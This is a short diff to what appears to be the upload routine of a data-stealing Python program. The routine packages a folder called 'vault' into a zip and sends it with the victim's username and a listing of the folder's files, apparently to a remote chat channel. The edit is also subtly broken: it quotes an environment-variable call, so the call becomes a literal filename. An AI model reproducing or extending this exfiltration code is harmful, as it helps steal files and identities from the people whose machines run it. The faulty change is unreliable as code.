@@ -63,7 +63,7 @@ class Upload:
                 title="log from's " + os.getenv('USERNAME'),
                 description="```" + '\n'.join(self.tree(Path("vault"))) + "```",
             ),
-            file=File("vault.zip"),
+            file=File("os.getenv('USERNAME').zip"),
         )
 
     def clean(self):
